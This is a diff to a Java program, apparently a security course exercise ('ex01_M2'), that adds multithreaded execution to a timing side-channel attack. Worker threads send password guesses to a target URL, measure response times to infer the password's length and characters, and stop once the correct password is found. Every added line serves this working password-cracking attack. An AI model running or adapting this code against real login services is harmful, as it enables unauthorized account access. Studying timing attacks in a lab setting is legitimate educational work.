@@ -7,6 +7,9 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 import static java.lang.System.exit;
 
@@ -31,6 +34,9 @@ public class ex01_M2 {
     public static String USER_ID = "ID";
 
     public static int N_TIME_CHECK = 2;
+
+    public static boolean USE_CONCURRENT = true;
+    public static int THREAD_POOL_SIZE = 4;
 
     // Flags
     public static long FOUND_THE_PASSWORD = -1;
@@ -169,6 +175,112 @@ public class ex01_M2 {
         return result;
     }
 
+    public static String[][] splitPasswordStringsPools(List<String> passwords)
+    {
+        int totalAmount = passwords.size();
+        int charInEachPool = totalAmount / THREAD_POOL_SIZE + 1;
+
+        String[][] splittedPassword = new String[THREAD_POOL_SIZE][];
+
+        for (int i = 0; i < THREAD_POOL_SIZE; i++)
+        {
+            int charsLeftToInsert = totalAmount - charInEachPool * i;
+            if(charsLeftToInsert >= charInEachPool) {
+                splittedPassword[i] = new String[charInEachPool];
+            }
+            else {
+                splittedPassword[i] = new String[charsLeftToInsert];
+            }
+
+            for (int j = 0; j < charInEachPool; j++)
+            {
+                if((i*charInEachPool + j) >= totalAmount){
+                    break;
+                }
+                splittedPassword[i][j] = passwords.get(i*charInEachPool + j);
+            }
+        }
+
+        return splittedPassword;
+    }
+
+    public static class ConcurrentTimeAttack implements Runnable
+    {
+        int threadPoolId;
+        int numberOfAttempts;
+        boolean debug;
+        String[] passwordsToCheck;
+        Map<String, PossiblePasswordData> result;
+
+        public ConcurrentTimeAttack(int threadPoolIdArg, int numberOfAttemptsArg, String[]passwordToCheckArg, boolean debugArg, Map<String, PossiblePasswordData> resultArg)
+        {
+            result = resultArg;
+            threadPoolId = threadPoolIdArg;
+            numberOfAttempts = numberOfAttemptsArg;
+            passwordsToCheck = passwordToCheckArg;
+            debug = debugArg;
+        }
+
+        @Override
+        public void run() {
+            float responseTime;
+            for(int i = 0; i < numberOfAttempts ; i++)
+            {
+                if (debug && (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / DEBUG_MESSAGE_COUNT) == 0)) {
+                    System.out.println(String.format("checked %d", i));
+                }
+
+                for (String password : passwordsToCheck) {
+                    responseTime = checkResponseTimeInMicrosecond(buildUrlFromPassword(password));
+
+                    if (responseTime == FOUND_THE_PASSWORD) {
+                        foundTheRightPassword(password);
+                        exit(0);
+                    } else if (responseTime == ERROR_WHILE_CHECK_TIME) {
+                        result.get(password).passwordErrors += 1;
+                    } else {
+                        result.get(password).passwordAttempts += 1;
+                        result.get(password).passwordSumTime += responseTime;
+                    }
+                }
+            }
+
+            if(DEBUG_MESSAGE){
+                System.out.println(String.format("thread %d finished running", threadPoolId));
+            }
+        }
+    }
+
+    public static Map<String, PossiblePasswordData> executeTimingAttackConcurrent(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
+    {
+        Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
+
+        for (String password : passwordsToCheck) {
+            result.put(password, new PossiblePasswordData());
+        }
+        String[][] splittedPassword = splitPasswordStringsPools(passwordsToCheck);
+
+        // first call to do some setup in java:
+        checkResponseTime(buildUrlFromPassword("123"));
+
+        ExecutorService executorService = Executors.newFixedThreadPool(THREAD_POOL_SIZE);
+        for (int threadPoolId = 0; threadPoolId < THREAD_POOL_SIZE; threadPoolId++) {
+
+            executorService.execute(new ConcurrentTimeAttack(threadPoolId, numberOfAttempts, splittedPassword[threadPoolId], debug, result));
+        }
+        try {
+            executorService.shutdown();
+            executorService.awaitTermination(Long.MAX_VALUE, TimeUnit.DAYS);
+        }
+        catch (InterruptedException e){
+            if(DEBUG_MESSAGE) {
+                System.out.println("Error waiting to executorService to finish running!");
+            }
+        }
+
+        return result;
+    }
+
     public static boolean validateAttackResults(Map<String, PossiblePasswordData> results, int checksAttempts)
     {
         for (String password : results.keySet())
@@ -221,7 +333,13 @@ public class ex01_M2 {
             boolean attackSucceed = false;
             Map<String, PossiblePasswordData> results = null;
             while (!attackSucceed) {
-                results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
+                if (USE_CONCURRENT) {
+                    results = executeTimingAttackConcurrent(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
+                }
+                else
+                {
+                    results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
+                }
                 attackSucceed = validateAttackResults(results, CHECK_PASSWORD_LENGTH_ATTEMPTS);
             }
             calculateAverageForEachPossiblePassword(results);
@@ -280,7 +398,12 @@ public class ex01_M2 {
                 Map<String, PossiblePasswordData> results = null;
                 while (!attackSucceed)
                 {
-                    results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
+                    if (USE_CONCURRENT) {
+                        results = executeTimingAttackConcurrent(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
+                    }
+                    else {
+                        results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
+                    }
                     attackSucceed = validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);
                 }
                 calculateAverageForEachPossiblePassword(results);
